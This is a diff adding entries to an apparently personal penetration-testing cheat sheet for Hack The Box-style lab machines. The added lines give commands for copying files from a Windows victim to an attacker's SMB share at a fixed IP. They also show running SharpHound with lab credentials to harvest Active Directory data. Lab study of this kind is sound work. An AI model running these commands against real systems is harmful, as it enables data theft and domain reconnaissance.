@@ -197,6 +197,13 @@ Password Protected SSH Private Key:
   
  
  Windows: 
+ 	- How to extract files (smb needs to be running on the victim)
+		- Attacker: 
+			- impacket-smbserver smb Downloads/ 
+		- Victim: 
+			- net use \\10.10.16.23\smb /u:df df
+			- copy 20220314100025_BloodHound.zip \\10.10.16.23\smb\
+
  	- File/Folder enume:
 		- Check access of a file: icacls <filename or dir>
 		- Check ownership of a file: dir /q root.txt
@@ -275,6 +282,14 @@ Password Protected SSH Private Key:
 	
 	- LDAP
 		- ldapsearch: ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local"
+	- Extract LDAP Data using bloodhound: 
+		- Download SharpHound.ps1 into the victim
+		- Execute SharpHound.ps1 on the vicitm: .\SharpHound.ps1
+		- Run the following commands on the victim: 
+			- invoke-bloodhound -collectionmethod all -domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice
+			- Invoke-BloodHound -CollectionMethod All
+		- Get the resulting files on your machine. 
+			
 	- enum4linux: 
 		- enum4linux forest.htb > enum4linux.txt
 		- cat enum4linux.txt | grep -i users
